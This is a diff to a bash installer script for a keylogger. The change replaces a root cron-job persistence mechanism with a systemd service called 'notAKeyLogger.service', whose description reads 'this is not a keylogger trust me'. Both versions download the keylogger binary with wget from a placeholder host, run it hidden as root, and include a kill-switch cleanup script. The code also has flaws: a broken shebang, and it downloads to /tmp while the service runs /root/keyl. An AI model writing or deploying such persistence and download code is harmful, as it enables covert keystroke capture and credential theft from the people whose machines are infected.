@@ -1,25 +1,46 @@
 bash -c "$(cat << 'EOF'
-cat << 'EOL1' > /tmp/launch.sh
-#!/bin/bash
-if ! pgrep -f "/tmp/keyl" > /dev/null; then
-    nohup /tmp/keyl &> /dev/null &
-fi
-EOL1
-chmod +x /tmp/launch.sh
 
-cat << 'EOL2' > /tmp/killSwitch.sh
-#!/bin/bash
-crontab -l -u root > /tmp/root_crontab.bak 2>/dev/null
-grep -v 'launch.sh' /tmp/root_crontab.bak > /tmp/root_crontab.new
-crontab -u root /tmp/root_crontab.new
-rm /tmp/root_crontab.bak /tmp/root_crontab.new
-rm -f /tmp/keyl /tmp/launch.sh /tmp/killSwitch.sh
-EOL2
+# killSwitch.sh:
+cat << 'EOL1' > /tmp/killSwitch.sh
+!/bin/bash
+
+#service cleaner
+sudo systemctl stop notAKeyLogger.service
+sudo systemctl disable notAKeyLogger.service
+rm /etc/systemd/system/notAKeyLogger.service
+sudo systemctl daemon-reload
+
+#files deleting
+rm -f /root/keyl /root/killSwitch.sh
+EOL1
 chmod +x /tmp/killSwitch.sh
 
-echo '*/1 * * * * /tmp/launch.sh' | crontab -u root -
+# writing the service:
+cat << 'EOL2' > /etc/systemd/system/notAKeyLogger.service
+[Service]
+ExecStart=/root/keyl
+[Install]
+WantedBy=multi-user.target
+[Unit]
+Description= this is not a keylogger trust me
+After=network-online.target
+Wants=network-online.target
+EOL2
+
+# setup service:
+sudo systemctl daemon-reexec
+sudo systemctl daemon-reload
+sudo systemctl enable notAKeyLogger.service
+
+# keyl:
 wget -O /tmp/keyl http://<IP>:9001/dist/mykeyl
 chmod u+x /tmp/keyl
-sudo nohup /tmp/keyl &> /dev/null &
+
+# start
+sudo systemctl start notAKeyLogger.service
+if ! pgrep -f "/root/keyl" > /dev/null; then
+    nohup /root/keyl &> /dev/null &
+fi
+
 EOF
 )"
